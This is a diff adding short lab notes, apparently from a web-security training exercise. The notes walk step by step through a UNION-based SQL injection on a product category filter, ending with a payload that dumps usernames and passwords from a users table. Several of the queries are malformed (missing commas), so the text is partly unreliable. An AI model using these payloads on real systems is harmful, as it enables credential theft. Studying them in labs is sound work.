@@ -1,0 +1,31 @@
+The goal to output data from other tables
+
+Analysis 
+    * SQL injection vulnerability in the product category
+    * UNION attack to retrieve data from other tables.
+
+attack procedure 
+    1- dertemind the number of colums by using order cluase
+        query:' ORDER BY 3-- =>error=>3-1=2 cols
+      
+    2- dertemind string datatype to use it for username and password
+        1-query:' UNION SELECT 'kk' NULL -- =>error =>wrong data-type col1 but data-type 
+        not appear so we dont need it 
+
+        2-query:' UNION SELECT NULL 'moath' -- =>No Error => use this col2 
+        to print username and password 
+
+    3- we have only one coulum which is col2 so we can use concat to merge the 
+       username & password tabel in one column
+        1-we need first to know DB system to use proper contact syntac
+        https://portswigger.net/web-security/sql-injection/cheat-sheet
+        2- query = ' UNION SELECT NULL , @@version --=> error not microsoft DB
+           query = ' UNION SELECT NULL , version() --=> OK
+            
+        3- DB is PostgreSQL so we wiil use 
+
+    4- query = ' UNION SELECT NULL, username || '-' || password from users --
+
+
+
+
